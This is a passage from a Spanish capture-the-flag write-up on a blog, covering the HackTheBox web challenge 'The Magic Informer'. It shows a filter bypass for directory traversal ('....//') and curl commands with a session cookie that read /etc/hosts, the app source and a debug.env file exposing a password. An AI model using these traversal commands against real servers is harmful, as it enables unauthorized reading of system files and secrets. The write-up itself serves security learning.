<!doctype html><html lang="es"><head><title>The Magic Informer | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Navegaci贸n de directorios. Lectura de archivos locales. JWT. Broken Access Control. SSRF. Injecci贸n de comandos. RCE"><meta itemprop="description" content="Navegaci贸n de directorios. Lectura de archivos locales. JWT. Broken Access Control. SSRF. Injecci贸n de comandos. RCE"><meta name="twitter:card" content="Navegaci贸n de directorios. Lectura de archivos locales. JWT. Broken Access Control. SSRF. Injecci贸n de comandos. RCE"><meta name="twitter:description" content="Navegaci贸n de directorios. Lectura de archivos locales. JWT. Broken Access Control. SSRF. Injecci贸n de comandos. RCE"><meta property="og:description" content="Navegaci贸n de directorios. Lectura de archivos locales. JWT. Broken Access Control. SSRF. Injecci贸n de comandos. RCE"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="The Magic Informer"><meta property="twitter:title" content="The Magic Informer"><meta property="og:title" content="The Magic Informer"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/web/the-magic-informer/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- WEB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/&text=The%20Magic%20Informer" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/htb-challenges/web/the-magic-informer/&title=The%20Magic%20Informer" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">The Magic Informer</h1><p class="mb4 f6 dib tracked">16 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#registrando-una-nueva-cuenta">Registrando una nueva cuenta</a></li><li><a href="#navegaci贸n-de-directorios-y-lectura-de-archivos-locales">Navegaci贸n de directorios y lectura de archivos locales</a></li><li><a href="#an谩lisis-de-c贸digo-est谩tico">An谩lisis de c贸digo est谩tico</a><ul><li><a href="#implementaci贸n-de-la-base-de-datos">Implementaci贸n de la base de datos</a></li><li><a href="#rutas-disponibles">Rutas disponibles</a></li></ul></li><li><a href="#efectuando-el-ataque">Efectuando el ataque</a><ul><li><a href="#convirti茅ndonos-en-admin">Convirti茅ndonos en <code>admin</code></a></li><li><a href="#m谩s-an谩lisis-de-c贸digo-fuente">M谩s an谩lisis de c贸digo fuente</a></li><li><a href="#ataque-de-ssrf">Ataque de SSRF</a></li><li><a href="#inyecci贸n-de-comandos">Inyecci贸n de comandos</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Tenemos este sitio web:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-1.png" alt="The Magic Informer 1"></p><p>Esta vez no tenemos el c贸digo fuente, por lo que debemos dar vueltas con el sitio web.</p><h2 id="registrando-una-nueva-cuenta">Registrando una nueva cuenta</h2><p>En la parte inferior de la p谩gina podemos encontrar un enlace a un formulario de registro:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-2.png" alt="The Magic Informer 2"></p><p>Entonces nos registramos y luego iniciamos sesi贸n:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-3.png" alt="The Magic Informer 3"></p><p>Y tenemos acceso a nuestro <em>dashboard</em>:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-4.png" alt="The Magic Informer 4"></p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-5.png" alt="The Magic Informer 5"></p><h2 id="navegaci贸n-de-directorios-y-lectura-de-archivos-locales">Navegaci贸n de directorios y lectura de archivos locales</h2><p>Podemos probar inyecciones comunes en la en el formulario anterior. La clave est谩 en la subida de archivos. Usemos Burp Suite para interceptar peticiones y respuestas:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-6.png" alt="The Magic Informer 6"></p><p>Parece que el archivo cargado se transforma en un documento <code>.docx</code>. Podemos descargarlo con el enlace que aparece en el sitio web:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-7.png" alt="The Magic Informer 7"></p><p>Y en Burp Suite podemos ver la petici贸n:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-8.png" alt="The Magic Informer 8"></p><p>Hay un par谩metro <code>resume</code>. Veamos si podemos descargar el mismo archivo pero a帽adiendo <code>./</code> a la ruta (es decir, desde el mismo directorio):</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-9.png" alt="The Magic Informer 9"></p><p>Y funciona, por lo que el servidor podr铆a ser vulnerable a navevagi贸n de directorios. Veamos qu茅 sucede si solicitamos un archivo que no existe:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-10.png" alt="The Magic Informer 10"></p><p>El mensaje de error filtra la ruta absoluta donde el servidor est谩 intentando encontrar el archivo. En este punto, podemos intentar subir al directorio ra铆z y leer <code>/etc/passwd</code>:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-11.png" alt="The Magic Informer 11"></p><p>Pero vemos que <code>../</code> no es efectivo, la ruta se queda como <code>/app/uploads/etc/passwd</code>. Esto puede deberse a que el servidor est谩 filtrando <code>../</code>, probablemente reemplazando cada coincidencia por una cadena vac铆a. Podemos evitar este filtro usando <code>....//</code>, porque el servidor encontrar谩 la cadena <code>../</code> y, al reemplazarla, la ruta resultante ser谩 exactamente <code>../</code>:</p><p><img src="/images/other/HTB%20UniCTF/The-Magic-Informer-12.png" alt="The Magic Informer 12"></p><p>Ah铆 est谩. En este punto, podemos enumerar m谩s archivos desde Burp Suite (usando m谩s pesta帽as del Repeater) o movernos a la consola con <code>curl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'167.99.206.87:30463/download?resume=....//....//etc/hosts'</span> -H <span class="code-dark-yellow">'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFzZGYiLCJpYXQiOjE2NzAyMDQ1MDN9.SvYFO9b3ya7Gc0cWOFiKqM_sXOd-avH5bTf1d1kfss8'</span>  
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.244.9.165    ng-themagicinformer-2qvlt-655f685c7d-9gm59
</code></pre></div><p>Podemos definir una funci贸n de <em>shell</em> para trabajar m谩s c贸modamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> read_file<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"167.99.206.87:30463/download?resume=....//..../<span class="code-dark-cyan">$1</span>"</span> -H <span class="code-dark-yellow">'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFzZGYiLCJpYXQiOjE2NzAyMDQ1MDN9.SvYFO9b3ya7Gc0cWOFiKqM_sXOd-avH5bTf1d1kfss8'</span> <span class="code-dark-yellow">}</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.244.9.165    ng-themagicinformer-2qvlt-655f685c7d-9gm59
</code></pre></div><h2 id="an谩lisis-de-c贸digo-est谩tico">An谩lisis de c贸digo est谩tico</h2><p>Sabemos que el servidor web est谩 utilizando Express JS en Node.js debido a la cabecera <code>X-Powered-by</code>. Por lo tanto, podemos intuir que el <em>script</em> principal es <code>index.js</code> (si no, podr铆a ser <code>app.js</code>, <code>server.js</code>, <code>main.js</code>&mldr;):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/index.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk6">*</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> dotenv </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'dotenv'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> cookieParser </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"cookie-parser"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> path </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"path"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> express </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"express"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> nunjucks </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"nunjucks"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> fileUpload </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"express-fileupload"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk6">*</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> router </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"./routes/index.js"</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { Database } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"./database.js"</span><span class="mtk1">;</span>

<span class="mtk1">dotenv.</span><span class="mtk8">config</span><span class="mtk1">({</span><span class="mtk1">path</span><span class="mtk1">: </span><span class="mtk4">'/app/debug.env'</span><span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">Database</span><span class="mtk1">(</span><span class="mtk4">'admin.db'</span><span class="mtk1">);</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">());</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">cookieParser</span><span class="mtk1">());</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span>
<span class="mtk1">    </span><span class="mtk8">fileUpload</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">limits</span><span class="mtk1">: {</span>
<span class="mtk1">            </span><span class="mtk1">fileSize</span><span class="mtk1">: </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1024</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1024</span><span class="mtk1"> </span><span class="mtk3">// 2 MB</span>
<span class="mtk1">        },</span>
<span class="mtk1">        </span><span class="mtk1">abortOnLimit</span><span class="mtk1">: </span><span class="mtk6">true</span>
<span class="mtk1">    })</span>
<span class="mtk1">);</span>

<span class="mtk1">nunjucks.</span><span class="mtk8">configure</span><span class="mtk1">(</span><span class="mtk4">'views'</span><span class="mtk1">, {</span>
<span class="mtk1">    </span><span class="mtk1">autoescape</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">express</span><span class="mtk1">: </span><span class="mtk1">app</span>
<span class="mtk1">});</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">disable</span><span class="mtk1">(</span><span class="mtk4">'etag'</span><span class="mtk1">);</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">'views'</span><span class="mtk1">, </span><span class="mtk4">'./views'</span><span class="mtk1">);</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/static'</span><span class="mtk1">, </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">static</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk4">'static'</span><span class="mtk1">)));</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(router.</span><span class="mtk8">default</span><span class="mtk1">(</span><span class="mtk1">db</span><span class="mtk1">));</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">'*'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">404</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'404 page not found'</span>
<span class="mtk1">    });</span>
<span class="mtk1">});</span>

<span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">connect</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">migrate</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk6">1337</span><span class="mtk1">, </span><span class="mtk4">'0.0.0.0'</span><span class="mtk1">, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">'Listening on port 1337'</span><span class="mtk1">));</span>  
<span class="mtk1">})();</span>
</code></pre></div><p>Desde este <em>script</em>, podemos ver otros nombres de archivos como una base de datos SQLite3 (<code>admin.db</code>) o un archivo de configuraci贸n en <code>/app/debug.env</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/debug.env  
DEBUG_PASS=vULszIrfzcons8m
</code></pre></div><p>Luego, podemos leer la implementaci贸n del acceso a base de datos (<code>database.js</code>) y las rutas disponibles (<code>routes/index.js</code>).</p><h3 id="implementaci贸n-de-la-base-de-datos">Implementaci贸n de la base de datos</h3><p>Este es el <em>script</em> <code>database.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/database.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { Database </span><span class="mtk5">as</span><span class="mtk1"> sqlite } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'sqlite-async'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> crypto </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"crypto"</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">md5</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">data</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">createHash</span><span class="mtk1">(</span><span class="mtk4">'md5'</span><span class="mtk1">).</span><span class="mtk8">update</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">).</span><span class="mtk8">digest</span><span class="mtk1">(</span><span class="mtk4">"hex"</span><span class="mtk1">);</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Database</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">constructor</span><span class="mtk1">(</span><span class="mtk9 mtki">db_file</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.db_file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">db_file</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.db </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">connect</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.db </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> sqlite.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk9">this</span><span class="mtk1">.db_file);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">migrate</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk8 mtku">crypto</span><span class="mtk1">.</span><span class="mtk8">randomBytes</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">).</span><span class="mtk8">toString</span><span class="mtk1">(</span><span class="mtk4">'hex'</span><span class="mtk1">));</span>

